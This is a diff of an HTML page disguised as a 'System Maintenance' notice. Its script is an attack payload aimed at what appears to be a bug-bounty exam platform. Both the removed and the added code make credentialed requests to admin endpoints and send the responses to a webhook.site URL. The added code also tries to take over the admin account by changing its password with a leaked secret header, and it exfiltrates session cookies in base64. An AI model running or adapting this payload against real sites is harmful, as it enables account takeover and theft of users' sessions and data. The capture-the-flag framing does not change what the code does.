@@ -1,28 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>System Maintenance...</h1>
     <script>
         const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
         const base = "https://api-bugbounty-exam.hashacademy.co";
-        const msgId = "69ea4208bee6d6b7c6645889";
 
-        const paths = [
-            "/api/v1/admin/logs",
-            "/api/admin/system/status",
-            `/api/v1/contact/messages/${msgId}`
-        ];
-
-        paths.forEach(path => {
-            fetch(base + path, { credentials: "include" })
-                .then(r => r.text())
-                .then(data => {
-                    fetch(webh, {
-                        method: "POST",
-                        body: JSON.stringify({ path: path, data: data })
-                    });
-                })
-                .catch(e => {});
+        // 1. Attempt ATO by changing the Admin's password
+        // We use the platform secret you found in the headers if required
+        fetch(`${base}/api/auth/profile`, {
+            method: 'PATCH',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Platform-Secret': 'rNt4C4r_c4ch3_s3cr3t_2026' 
+            },
+            body: JSON.stringify({
+                password: 'Hacked_Admin_2026!',
+                phoneNumber: '555-FLAG-HUNT'
+            }),
+            credentials: 'include'
+        }).then(r => r.json()).then(data => {
+            fetch(webh, { method: 'POST', body: JSON.stringify({ type: 'ATO_RESULT', data: data })});
         });
+
+        // 2. Fetch the Restricted Admin Logs (Likely Flag 5)
+        fetch(`${base}/api/v1/admin/logs`, { credentials: 'include' })
+            .then(r => r.text())
+            .then(d => {
+                fetch(webh, { method: 'POST', body: JSON.stringify({ type: 'LOG_LEAK', content: d })});
+            });
+
+        // 3. Exfiltrate current session cookies (if not HttpOnly)
+        fetch(webh + "/?cookie=" + btoa(document.cookie));
     </script>
 </body>
 </html>
